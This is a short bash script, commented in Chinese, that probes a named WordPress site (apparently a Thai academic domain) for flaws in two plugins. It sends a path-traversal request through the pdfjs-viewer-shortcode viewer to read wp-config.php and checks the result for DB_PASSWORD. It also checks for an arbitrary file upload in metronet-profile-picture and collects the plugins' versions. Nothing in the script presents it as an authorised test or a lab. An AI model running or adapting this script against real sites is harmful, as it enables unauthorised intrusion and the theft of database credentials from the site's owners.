#!/bin/bash
echo "╔════════════════════════════════════════════════════════╗"
echo "║           WordPress插件漏洞检测                        ║"
echo "╚════════════════════════════════════════════════════════╝"
echo
echo "[+] 发现插件:"
echo "    1. metronet-profile-picture"
echo "    2. pdfjs-viewer-shortcode"
echo

# 测试metronet-profile-picture任意文件上传
echo "[*] 测试 metronet-profile-picture 任意文件上传..."
curl -sk "https://aay.ac.th/wp-content/plugins/metronet-profile-picture/" -o /dev/null -w "%{http_code}\n"

# 测试pdfjs-viewer-shortcode路径遍历
echo "[*] 测试 pdfjs-viewer-shortcode 路径遍历..."
curl -sk "https://aay.ac.th/wp-content/plugins/pdfjs-viewer-shortcode/pdfjs/web/viewer.php?file=../../../wp-config.php" -o pdfjs_test.html
grep -qi "DB_PASSWORD" pdfjs_test.html && echo "✅ 路径遍历成功！wp-config.php可读" || echo "❌ 路径遍历失败"

# 检查插件readme版本
echo
echo "[*] 获取插件版本..."
curl -sk "https://aay.ac.th/wp-content/plugins/metronet-profile-picture/readme.txt" 2>&1 | grep -i "version" | head -3
curl -sk "https://aay.ac.th/wp-content/plugins/pdfjs-viewer-shortcode/readme.txt" 2>&1 | grep -i "version" | head -3
